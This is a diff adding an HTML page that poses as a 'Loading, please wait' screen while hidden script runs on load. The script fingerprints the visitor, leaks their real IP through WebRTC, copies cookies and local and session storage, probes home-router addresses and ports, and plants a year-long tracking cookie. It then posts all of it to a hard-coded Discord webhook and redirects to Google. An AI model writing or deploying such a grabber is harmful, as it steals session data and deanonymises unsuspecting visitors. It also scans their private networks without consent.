@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  body { background: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  #msg { color: #333; font-size: 18px; }
+</style>
+</head>
+<body>
+<div id="msg">Loading, please wait...</div>
+<script>
+// ================================================================
+// COMPLETE DATA COLLECTION + VPN DETECTION
+// Uses ipapi.co for HTTPS geolocation (no key required)
+// Replace YOUR_WEBHOOK_URL with your actual Discord webhook URL.
+// ================================================================
+(function() {
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545530999134232650/jhvW9RsKGyTxMla8MxSQ3t0QS3edP9uur3UAps0Zg9TxzEWihuSTb-8wHeRkVLhTos7F';
+
+  function sendToDiscord(data) {
+    const jsonStr = JSON.stringify(data, null, 2);
+    let content = jsonStr;
+    if (content.length > 1900) content = content.substring(0, 1900) + '\n... [TRUNCATED]';
+    const payload = { content: '```json\n' + content + '\n```' };
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+  }
+
+  // ---------- IP GEOLOCATION (ipapi.co) ----------
+  async function getIPLocation() {
+    try {
+      const resp = await fetch('https://ipapi.co/json/');
+      const data = await resp.json();
+      return data;
+    } catch (e) {
+      return { error: 'Failed to fetch location' };
+    }
+  }
+
+  // ---------- VPN DETECTION ----------
+  function detectVPN(ipLocation) {
+    const result = { vpn: false, reasons: [] };
+
+    // 1. Check organization for known VPN/hosting keywords
+    const org = (ipLocation.org || '').toLowerCase();
+    const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'aws', 'digitalocean', 'hetzner', 'linode', 'vultr', 'tzulo', 'm247', 'private layer'];
+    for (const kw of vpnKeywords) {
+      if (org.includes(kw)) {
+        result.vpn = true;
+        result.reasons.push('org_keyword: ' + kw);
+      }
+    }
+
+    // 2. Check ASN for known hosting/VPN ranges
+    const asn = (ipLocation.asn || '').toUpperCase();
+    const vpnASNs = ['AS11878', 'AS13335', 'AS16509', 'AS14618', 'AS20473', 'AS25820', 'AS53667'];
+    if (vpnASNs.includes(asn)) {
+      result.vpn = true;
+      result.reasons.push('asn_match: ' + asn);
+    }
+
+    // 3. Check timezone mismatch (if geolocation timezone differs from system)
+    const geoTimezone = ipLocation.timezone || '';
+    const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    if (geoTimezone && systemTimezone && geoTimezone !== systemTimezone) {
+      result.vpn = true;
+      result.reasons.push('timezone_mismatch: ' + geoTimezone + ' vs ' + systemTimezone);
+    }
+
+    return result;
+  }
+
+  // ---------- COMPLETE FINGERPRINT ----------
+  function getFingerprint() {
+    const canvas = document.createElement('canvas');
+    canvas.width = 256;
+    canvas.height = 256;
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0, 0, 256, 256);
+    ctx.fillStyle = '#fff';
+    ctx.fillText('fingerprint', 10, 10);
+    ctx.fillStyle = '#000';
+    ctx.fillText('webgl', 50, 50);
+    const canvasHash = canvas.toDataURL().substring(0, 64);
+
+    let webglHash = '';
+    let webglExtensions = [];
+    try {
+      const gl = document.createElement('canvas').getContext('webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          webglHash = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + '|' +
+                      gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        webglExtensions = gl.getSupportedExtensions() || [];
+      }
+    } catch (e) {}
+
+    let audioHash = '';
+    let audioSampleRate = '';
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      audioSampleRate = audioCtx.sampleRate;
+      const osc = audioCtx.createOscillator();
+      const analyser = audioCtx.createAnalyser();
+      osc.connect(analyser);
+      analyser.connect(audioCtx.destination);
+      osc.start(0);
+      osc.stop(0.001);
+      const data = new Uint8Array(analyser.frequencyBinCount);
+      analyser.getByteFrequencyData(data);
+      audioHash = Array.from(data).join(',').substring(0, 64);
+      audioCtx.close();
+    } catch (e) {}
+
+    const fonts = [];
+    try {
+      const testFonts = [
+        'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+        'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Lucida Console',
+        'Palatino Linotype', 'Book Antiqua', 'Arial Black', 'Helvetica',
+        'Geneva', 'Monaco', 'Courier', 'Symbol', 'Wingdings', 'Webdings'
+      ];
+      for (const f of testFonts) {
+        if (document.fonts.check('12px ' + f)) fonts.push(f);
+      }
+    } catch (e) {}
+
+    return {
+      canvas: canvasHash,
+      webgl_renderer: webglHash,
+      webgl_extensions: webglExtensions,
+      audio_hash: audioHash,
+      audio_sample_rate: audioSampleRate,
+      fonts: fonts,
+      ua: navigator.userAgent,
+      language: navigator.language,
+      languages: navigator.languages,
+      platform: navigator.platform,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        orientation: screen.orientation ? screen.orientation.type : 'unknown'
+      },
+      window: {
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight,
+        devicePixelRatio: window.devicePixelRatio
+      },
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      doNotTrack: navigator.doNotTrack || 'unknown',
+      touchSupport: 'ontouchstart' in window,
+      cookieEnabled: navigator.cookieEnabled,
+      platformVersion: navigator.userAgentData ? navigator.userAgentData.platformVersion : 'unknown',
+      architecture: navigator.userAgentData ? navigator.userAgentData.architecture : 'unknown',
+      bitness: navigator.userAgentData ? navigator.userAgentData.bitness : 'unknown'
+    };
+  }
+
+  // ---------- WEBRTC IP LEAK ----------
+  function getWebRTCIPs() {
+    return new Promise((resolve) => {
+      let ips = [];
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('test');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (e) => {
+          if (e.candidate) {
+            const parts = e.candidate.candidate.split(' ');
+            if (parts.length >= 5) {
+              const ip = parts[4];
+              if (ip && ip !== '0.0.0.0' && !ip.startsWith('127.') && !ip.startsWith('::')) {
+                ips.push(ip);
+              }
+            }
+          }
+        };
+        setTimeout(() => { pc.close(); resolve(ips); }, 2000);
+      } catch (e) { resolve(ips); }
+    });
+  }
+
+  // ---------- STORAGE THEFT ----------
+  function stealStorage() {
+    const data = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key) data.localStorage[key] = localStorage.getItem(key);
+      }
+    } catch (e) {}
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
+      }
+    } catch (e) {}
+    return data;
+  }
+
+  // ---------- NETWORK PROBE ----------
+  function probeNetwork() {
+    const targets = [
+      '192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1',
+      '192.168.1.254', '192.168.1.100', '192.168.2.1'
+    ];
+    const ports = [80, 443, 22, 8080, 3389, 5900];
+    const results = [];
+    const promises = targets.flatMap(ip => ports.map(port => {
+      const url = `http://${ip}:${port}`;
+      return fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(400) })
+        .then(() => results.push({ url, status: 'reachable' }))
+        .catch(() => results.push({ url, status: 'timeout' }));
+    }));
+    return Promise.allSettled(promises).then(() => results);
+  }
+
+  // ---------- BATTERY STATUS ----------
+  async function getBatteryStatus() {
+    try {
+      const battery = await navigator.getBattery();
+      return {
+        level: battery.level * 100,
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    } catch (e) { return null; }
+  }
+
+  // ---------- NETWORK INFORMATION ----------
+  function getNetworkInfo() {
+    try {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        return {
+          type: conn.effectiveType,
+          downlink: conn.downlink,
+          rtt: conn.rtt,
+          saveData: conn.saveData
+        };
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  // ---------- BROWSER EXTENSION DETECTION ----------
+  function detectExtensions() {
+    const extensions = [];
+    const knownExtensions = [
+      'chrome-extension://nmmhkkegccagdldgiimedpiccmgmieda',
+      'chrome-extension://jifpbeccnghkjeaalbbjmodiffmgedin',
+      'chrome-extension://aapocclcgogkmnckokdopfmhonfmgoek',
+      'chrome-extension://felcaaldnbdncclmgdcncolpebgiejap',
+      'chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm'
+    ];
+    for (const ext of knownExtensions) {
+      try {
+        const img = new Image();
+        img.src = ext + '/icon128.png';
+        extensions.push(ext);
+      } catch (e) {}
+    }
+    return extensions;
+  }
+
+  // ---------- PERSISTENT TRACKING ----------
+  function setTracking() {
+    const id = 't_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+    document.cookie = 'track=' + id + '; path=/; max-age=31536000; SameSite=Lax';
+    try { localStorage.setItem('track', id); } catch (e) {}
+  }
+
+  // ---------- MAIN EXECUTION ----------
+  (async function main() {
+    const ipLocation = await getIPLocation();
+    const fingerprint = getFingerprint();
+    const webrtcIPs = await getWebRTCIPs();
+    const storage = stealStorage();
+    const networkProbe = await probeNetwork();
+    const battery = await getBatteryStatus();
+    const networkInfo = getNetworkInfo();
+    const extensions = detectExtensions();
+    const vpnDetection = detectVPN(ipLocation);
+
+    const payload = {
+      timestamp: new Date().toISOString(),
+      ip_geolocation: ipLocation,
+      webrtc_ips: webrtcIPs,
+      vpn_detection: vpnDetection,
+      fingerprint: fingerprint,
+      storage: storage,
+      network_probe: networkProbe,
+      battery: battery,
+      network_info: networkInfo,
+      extensions: extensions,
+      url: window.location.href,
+      referrer: document.referrer,
+      document_ready_state: document.readyState
+    };
+
+    sendToDiscord(payload);
+    setTracking();
+
+    setTimeout(() => {
+      window.location.replace('https://www.google.com');
+    }, 5000);
+  })();
+
+})();
+</script>
+</body>
+</html>
